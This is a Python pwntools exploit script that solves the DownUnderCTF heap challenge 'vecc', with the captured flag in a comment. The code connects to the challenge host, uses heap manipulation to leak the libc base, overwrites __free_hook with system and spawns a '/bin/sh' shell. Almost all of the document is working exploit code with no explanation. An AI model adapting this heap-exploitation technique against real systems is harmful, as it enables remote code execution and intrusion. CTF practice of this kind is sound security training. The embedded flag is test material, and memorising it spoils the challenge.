#exploit for vecc
#DUCTF{h@v_2_z3r0_ur_all0ca710n5}
from pwn import *
import time
elf = ELF("./vecc")
libc=ELF('./libc6_2.27-3ubuntu1_amd64.so')
context.binary=elf
target=remote('chal.duc.tf',30007)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def add(index):
	sla("show vecc\n> ",str(1))
	sla("Index?\n> ",str(index))
	
def delete(index):
	sla("show vecc\n> ",str(2))
	sla("Index?\n> ",str(index))

def append(index,size,data,option=1):
	sla("show vecc\n> ",str(3))
	sla("Index?\n> ",str(index))
	if(option==0):
		sa("Length?\n> ",str(size))
	else:
		sla("Length?\n> ",str(size))
	time.sleep(1)
	target.send(data)
	

def clear(index):
	sla("show vecc\n> ",str(4))
	sla("Index?\n> ",str(index))

def leak(index):
	sla("show vecc\n> ",str(5))
	sla("Index?\n> ",str(index))
	leaks=target.recvline().strip("\n")
	return leaks
	
add(0)
append(0,0x10,(p32(8)+p32(0x8))*2)
delete(0)
add(1)
add(2)
append(1,0x500,"A"*0x500,0)
add(3)
add(4)
append(4,0x1,"A")
libc_base=u64(leak(4)[0:6].ljust(8,"\x00"))-0x3ebca0
libc_free_hook=libc_base+libc.symbols["__free_hook"]
libc_system=libc_base+libc.symbols["system"]
add(5)
add(5)
delete(2)
append(1,0x10,p64(0x602040)+p32(0)+p32(0x100))
append(3,0x20,p64(libc_free_hook-8)+p32(0)+p32(0x100)+p64(0)+p64(0x21))
append(4,0x20,"/bin/sh\x00"+p64(libc_system)*3)
target.interactive()
